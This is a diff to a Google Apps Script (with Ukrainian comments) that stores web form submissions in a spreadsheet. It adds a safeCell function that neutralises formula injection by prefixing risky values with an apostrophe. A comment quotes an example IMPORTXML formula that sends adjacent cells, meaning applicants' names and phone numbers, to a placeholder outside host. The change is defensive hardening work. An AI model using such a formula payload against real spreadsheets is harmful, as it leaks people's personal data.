@@ -67,10 +67,31 @@ function notifyEmail() {
  * адресою /exec: редактор показує один, а веб-застосунок може віддавати
  * попереднє розгортання. Відкрийте адресу в браузері — побачите цей рядок.
  */
-var VERSION = 'sheet.gs 2026-08-17 · відгуки на вакансії на окремому аркуші'
+var VERSION = 'sheet.gs 2026-08-17b · вакансії + захист від формул у клітинках'
 
 function doGet() {
   return ContentService.createTextOutput(VERSION)
+}
+
+/**
+ * Готує чуже значення до запису в клітинку.
+ *
+ * Таблиця вважає рядок, що починається з `=`, `+`, `-` або `@`, формулою — і
+ * виконує її, щойно власник відкриє файл. Тобто будь-хто, надіславши форму,
+ * може виконати код у чужій таблиці: `=IMPORTXML("https://чуже.місце/?د="&A2;"//a")`
+ * тихо відправляє на свій сервер сусідні клітинки — імена й телефони тих, хто
+ * до нас звертався. Це не теорія, це стандартний прийом.
+ *
+ * Апостроф спереду вимикає розбір: таблиця бачить текст, показує його як є, і
+ * самого апострофа в клітинці не видно.
+ *
+ * Пропускаємо через це геть усе, що прийшло ззовні, — і відгуки, і заявки
+ * клієнтів. Дати не чіпаємо, вони йдуть об'єктом Date, а не рядком.
+ */
+function safeCell(value) {
+  if (value === null || value === undefined) return ''
+  var text = String(value)
+  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text
 }
 
 /**
@@ -109,7 +130,12 @@ function doPost(e) {
 
   // Не заявка — на окремий аркуш, щоб тут рядок дорівнював заявці.
   if (data.kind === 'event') {
-    activitySheet(book).appendRow([new Date(), data.event, data.from || '', data.page || ''])
+    activitySheet(book).appendRow([
+      new Date(),
+      safeCell(data.event),
+      safeCell(data.from),
+      safeCell(data.page),
+    ])
     return ContentService.createTextOutput('ok')
   }
 
@@ -117,11 +143,11 @@ function doPost(e) {
   if (data.kind === 'vacancy') {
     vacancySheet(book).appendRow([
       new Date(),
-      data.name || '',
-      data.phone || '',
-      data.position || '',
-      data.comment || '',
-      data.source || '',
+      safeCell(data.name),
+      safeCell(data.phone),
+      safeCell(data.position),
+      safeCell(data.comment),
+      safeCell(data.source),
     ])
     sendVacancyEmail(data)
     return ContentService.createTextOutput('ok')
@@ -135,13 +161,13 @@ function doPost(e) {
     // Саме Date, а не готовий рядок: інакше таблиця сортує час як текст і
     // «10.08» стає раніше за «09.08». Вигляд задає формат колонки.
     new Date(),
-    data.name || '',
-    data.phone || '',
-    data.page || '',
+    safeCell(data.name),
+    safeCell(data.phone),
+    safeCell(data.page),
   ]])
   // Назву події вирішує Worker — він єдиний знає про всі канали.
   var col = eventColumn(sheet)
-  if (col) sheet.getRange(row, col).setValue(data.event || 'Заявка')
+  if (col) sheet.getRange(row, col).setValue(safeCell(data.event) || 'Заявка')
 
   return ContentService.createTextOutput('ok')
 }
